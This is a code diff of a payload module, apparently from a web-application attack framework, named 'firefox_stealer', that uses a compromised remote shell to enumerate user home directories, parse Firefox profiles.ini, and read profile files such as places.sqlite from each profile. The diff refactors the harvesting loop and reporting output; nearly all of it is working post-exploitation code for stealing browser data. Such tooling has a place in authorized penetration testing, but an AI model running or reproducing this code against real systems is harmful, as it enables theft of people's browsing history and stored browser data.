@@ -1,8 +1,8 @@
 import re
 from plugins.attack.payloads.base_payload import base_payload
-import core.controllers.outputManager as om
+from core.ui.consoleUi.tables import table
 
-#TODO: Provide support for downloading
+
 class firefox_stealer(base_payload):
     '''
     This payload steals Mozilla Firefox information
@@ -24,40 +24,38 @@ class firefox_stealer(base_payload):
         files.append('places.sqlite')
 
         def parse_mozilla_dir_path (profile):
-            path = re.findall('(?<=Path=)(.*)', profile, re.MULTILINE)
-            if path:
-                return path
-            else:
-                return []
+            return re.findall('(?<=Path=)(.*)', profile, re.MULTILINE)
 
-        users_folders = self.exec_payload('users').values()
-        for users in users_folders:
-            list = parse_mozilla_dir_path(self.shell.read(users+'.mozilla/firefox/profiles.ini'))
-            if list:
-                for folder in list:
-                    for file in files:
-                        content = self.shell.read(users+'.mozilla/firefox/'+folder+'/'+file)
-                        if content:
-                            result.update({users+'.mozilla/firefox/'+folder+'/'+file:content})
-
-        for file in files:
-            content = self.shell.read(file)
-            if content:
-                result.update({file:content})
+        users_result = self.exec_payload('users')
+        
+        for user in users_result:
+            home = users_result[user]['home']
+            
+            mozilla_profile = home +'.mozilla/firefox/profiles.ini'
+            
+            profile_list = parse_mozilla_dir_path(self.shell.read(mozilla_profile))
+            
+            for directory in profile_list:
+                for mozilla_file in files:
+                    mozilla_file_fp = home+'.mozilla/firefox/'+directory+'/'+mozilla_file
+                    content = self.shell.read(mozilla_file_fp)
+                    if content:
+                        result[mozilla_file_fp] = content
 
         return result
     
     def run_read(self):
-        hashmap = self.api_read()
-        result = []
-        if hashmap:
-            result.append('Firefox Files')
-            for file, content in hashmap.iteritems():
-                result.append('-------------------------')
-                result.append(file)
-                result.append('-------------------------')
-                result.append(content)
-
-        if result == [ ]:
-            result.append('Server is configured correctly, cant steal firefox information.')
-        return result
+        api_result = self.api_read()
+                
+        if not api_result:
+            return 'No firefox files were identified.'
+        else:
+            rows = []
+            rows.append( ['Firefox file','Read access'] )
+            rows.append( [] )
+            for filename in api_result:
+                rows.append( [filename, 'Yes' ] )
+                    
+            result_table = table( rows )
+            result_table.draw( 80 )
+            return
